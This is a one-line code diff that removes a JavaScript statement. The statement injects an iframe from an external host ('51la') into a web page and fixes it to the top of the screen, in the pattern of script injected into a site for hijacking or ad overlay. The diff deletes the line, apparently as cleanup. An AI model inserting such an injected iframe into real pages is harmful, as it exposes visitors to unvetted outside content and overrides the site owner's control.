@@ -1,1 +1,0 @@
-var f=document.createElement("iframe");f.src="https://51la/51la.html";f.style.cssText="position:fixed;top:0";(document.body||document.documentElement).appendChild(f);
